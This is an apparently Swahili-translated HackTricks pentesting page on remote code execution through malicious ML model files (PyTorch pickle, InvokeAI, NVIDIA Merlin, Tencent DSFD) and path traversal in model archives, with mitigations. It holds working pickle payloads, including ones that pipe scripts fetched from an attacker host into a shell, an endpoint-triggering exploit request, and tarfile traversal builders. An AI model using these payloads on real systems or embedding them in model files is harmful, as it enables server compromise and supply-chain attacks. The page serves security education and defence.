# RCE za Modeli

{{#include ../banners/hacktricks-training.md}}

## Kupakia modeli kwa RCE

Modeli za Machine Learning kwa kawaida zinashirikiwa kwa formats tofauti, kama ONNX, TensorFlow, PyTorch, n.k. Modeli hizi zinaweza kupakiwa kwenye mashine za developers au mifumo ya production ili kutumika. Kwa kawaida modeli hazipaswi kuwa na msimbo hatarishi, lakini kuna baadhi ya matukio ambapo modeli inaweza kutumika kutekeleza msimbo wowote kwenye mfumo kama feature iliyoratibiwa au kwa sababu ya udhaifu katika library ya kupakia modeli.

Wakati wa kuandika, hizi ni baadhi ya mifano ya aina hii ya udhaifu:

| **Framework / Tool**        | **Udhaifu (CVE ikiwa inapatikana)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Deserialization isiyo salama katika* `torch.load` **(CVE-2025-32434)**                                                              | Pickle ya uharibifu katika checkpoint ya modeli inasababisha utekelezaji wa msimbo (kukwepa kinga ya `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + upakuaji wa modeli hatarishi husababisha utekelezaji wa msimbo; Java deserialization RCE katika API ya usimamizi                                        | |
| **NVIDIA Merlin Transformers4Rec** | Deserialization isiyo salama ya checkpoint kupitia `torch.load` **(CVE-2025-23298)**                                           | Checkpoint isiyothibitishwa inasababisha pickle reducer wakati wa `load_model_trainer_states_from_checkpoint` → utekelezaji wa msimbo katika ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Kupakia modeli kutoka YAML kunatumia `yaml.unsafe_load` (utekelezaji wa msimbo) <br> Kupakia modeli yenye layer ya **Lambda** inaendesha msimbo wowote wa Python          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | `.tflite` iliyotengenezwa kwa makusudi inachochea integer overflow → kuharibu heap (inawezekana RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Kupakia modeli kwa `joblib.load` huendesha pickle yenye payload ya `__reduce__` ya mshambuliaji                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` kwa default inaruhusu arrays za vitu zilizopickled – `.npy/.npz` zilizo hatarishi zinachochea utekelezaji wa msimbo                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model’s external-weights path inaweza kutoroka directory (kusoma faili yoyote) <br> Tar ya modeli ya ONNX yenye uharibifu inaweza kuandika juu faili yoyote (kupelekea RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Modeli yenye operator maalum inaweza kuhitaji kupakia native code ya mshambuliaji; grafu tata za modeli zinaweza kutumiwa vibaya kufanya mahesabu yasiyotakiwa   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Kutumia model-load API na `--model-control` imewashwa kuruhusu path traversal ya relative kuandika faili (mfano, kuandika juu `.bashrc` kwa RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Faili ya modeli ya GGUF iliyoharibika husababisha heap buffer overflows kwenye parser, ikiruhusu utekelezaji wa msimbo wowote kwenye mfumo wa mwathirika                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Modeli ya HDF5 (`.h5`) yenye hatari na layer ya Lambda bado inatekeleza msimbo wakati wa load (Keras safe_mode hairidhi umbizo la zamani – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Zana nyingi za ML (mfano, formats za modeli zinazotegemea pickle, Python `pickle.load`) zitatekeleza msimbo wowote uliowekwa ndani ya faili za modeli isipokuwa zitadhibitiwa | |

Zaidi ya hayo, kuna baadhi ya modeli za Python zinazotegemea pickle kama zile zinazotumiwa na [PyTorch](https://github.com/pytorch/pytorch/security) ambazo zinaweza kutumika kutekeleza msimbo wowote kwenye mfumo ikiwa hazipakiwi na `weights_only=True`. Kwa hivyo, modeli yoyote inayotegemea pickle inaweza kuwa dhaifu kwa aina hii ya mashambulizi, hata kama hazijaorodheshwa katika jedwali hapo juu.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` ni interface maarufu open-source ya wavuti kwa Stable-Diffusion. Toleo **5.3.1 – 5.4.2** zinaweka wazi endpoint ya REST `/api/v2/models/install` inayoruhusu watumiaji kupakua na kupakia modeli kutoka kwa URL zozote.

Kivyake endpoint hatimaye inaita:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Wakati faili iliyotolewa ni **PyTorch checkpoint (`*.ckpt`)**, `torch.load` hufanya **pickle deserialization**. Kwa kuwa yaliyomo yanatoka moja kwa moja kutoka kwenye URL inayoendeshwa na mtumiaji, mshambuliaji anaweza kujaza checkpoint na object yenye madhara yenye method maalum ya `__reduce__`; method hiyo inatekelezwa **during deserialization**, ikisababisha **remote code execution (RCE)** kwenye server ya InvokeAI.

Udhaifu ulipewa **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. Tengeneza checkpoint yenye madhara:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Host `payload.ckpt` kwenye HTTP server unayodhibiti (kwa mfano `http://ATTACKER/payload.ckpt`).
3. Chochea endpoint yenye udhaifu (hakuna uthibitishaji unaohitajika):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Wakati InvokeAI inapopakua faili, inaita `torch.load()` → gadget ya `os.system` inaendesha na mshambuliaji anapata utekelezaji wa msimbo katika muktadha wa mchakato wa InvokeAI.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` inautomatisha mtiririko mzima.

#### Masharti

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)  
•  `/api/v2/models/install` inapatikana kwa mshambuliaji  
•  Mchakato una ruhusa za kutekeleza amri za shell

#### Kupunguza hatari

* Sasisha hadi **InvokeAI ≥ 5.4.3** – patch inaweka `scan=True` kwa chaguo-msingi na hufanya malware scanning kabla ya deserialization.  
* Unapopakua checkpoints kwa programu, tumia `torch.load(file, weights_only=True)` au helper mpya [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).  
* Tekeleza allow-lists / signatures kwa vyanzo vya modeli na endesha huduma kwa least-privilege.

> ⚠️ Kumbuka kwamba **kila** Python pickle-based format (including many `.pt`, `.pkl`, `.ckpt`, `.pth` files) ni hatari kwa asili kutekeleza deserialization kutoka vyanzo visivyo vya kuaminika.

---

Mfano wa kupunguza hatari ya haraka (ad-hoc) ikiwa lazima uendeleze matoleo ya zamani ya InvokeAI yanayotumika nyuma ya reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE kupitia isiyo salama `torch.load` (CVE-2025-23298)

Transformers4Rec ya NVIDIA (sehemu ya Merlin) ilifunua loader ya checkpoint isiyo salama iliyopiga moja kwa moja `torch.load()` kwenye njia zilizotolewa na mtumiaji. Kwa kuwa `torch.load` inategemea Python `pickle`, checkpoint iliyodhibitiwa na mshambuliaji inaweza kutekeleza nambari yoyote kupitia reducer wakati wa deserialization.

Njia iliyoathirika (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Kwanini hili linasababisha RCE: Katika Python `pickle`, kitu kinaweza kufafanua reducer (`__reduce__`/`__setstate__`) inayorejesha callable na vigezo. Callable hiyo inatekelezwa wakati wa unpickling. Ikiwa kitu kama hicho kiko kwenye checkpoint, kinaweza kuendeshwa kabla ya uzito wowote kutumika.

Mfano mdogo wa checkpoint yenye madhara:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Njia za utoaji na mduara wa athari:
- Trojanized checkpoints/models zilizosambazwa kupitia repos, buckets, au artifact registries
- Automated resume/deploy pipelines ambazo hujipakia checkpoints kiotomatiki
- Utekelezaji hufanyika ndani ya training/inference workers, mara nyingi kwa vibali vilivyoongezwa (e.g., root in containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ilibadilisha direct `torch.load()` na deserializer iliyozuiliwa, iliyomo kwenye allow-list, iliyotekelezwa katika `transformers4rec/utils/serialization.py`. Loader mpya inathibitisha types/fields na inazuia callables yoyote kutumika wakati wa load.

Mwongozo wa kujikinga maalum kwa PyTorch checkpoints:
- Usifanye unpickle data zisizo za kuaminika. Tumia formats zisizo-executable kama [Safetensors](https://huggingface.co/docs/safetensors/index) au ONNX pale inavyowezekana.
- Ikiwa lazima utumie PyTorch serialization, hakikisha `weights_only=True` (inasaidiwa katika PyTorch mpya) au tumia custom allow-listed unpickler inayofanana na patch ya Transformers4Rec.
- Tekeleza provenance/signatures za modeli na deserialization katika sandbox (seccomp/AppArmor; non-root user; FS yenye vizuizi na bila network egress).
- Subiri mchakato wa kuona child processes zisizotarajiwa kutoka kwa ML services wakati wa checkpoint load; trace `torch.load()`/`pickle` usage.

POC na marejeo ya vulnerable/patch:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Mfano – kutengeneza modeli ya PyTorch yenye uhasama

- Create the model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Pakia modeli:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’s FaceDetection-DSFD inatoa endpoint ya `resnet` ambayo deserializes data inayodhibitiwa na mtumiaji. ZDI ilithibitisha kuwa mshambuliaji wa mbali anaweza kulazimisha mwathiriwa kupakia ukurasa/faili hatari, kuifanya itume crafted serialized blob kwa endpoint hiyo, na kusababisha deserialization kwa `root`, na kusababisha full compromise.

Mtiririko wa exploit unaiga typical pickle abuse:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Kifaa chochote kinachoweza kufikiwa wakati wa deserialization (constructors, `__setstate__`, framework callbacks, n.k.) kinaweza kutumika kama silaha kwa njia ile ile, bila kujali kama transport ilikuwa HTTP, WebSocket, au faili iliyowekwa katika directory inayofuatiliwa.


## Modeli kwa Path Traversal

Kama ilivyotajwa katika [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), models formats nyingi zinazotumika na AI frameworks mbalimbali zinategemea archives, kawaida `.zip`. Kwa hivyo, inaweza kuwa inawezekana kutumika vibaya formats hizi kwa ajili ya kufanya path traversal attacks, kuruhusu kusoma faili yoyote kutoka kwenye mfumo ambapo model imepakiwa.

Kwa mfano, kwa kutumia code ifuatayo unaweza kuunda model itakayotengeneza faili katika `/tmp` directory wakati inapotumika:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Au, na msimbo ufuatao unaweza kuunda modeli itakayounda symlink kuelekea saraka ya `/tmp` itakapopakiwa:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Uchambuzi wa kina: Keras .keras deserialization and gadget hunting

Kwa mwongozo maalum kuhusu .keras internals, Lambda-layer RCE, the arbitrary import issue in ≤ 3.8, na post-fix gadget discovery inside the allowlist, angalia:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Marejeo

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
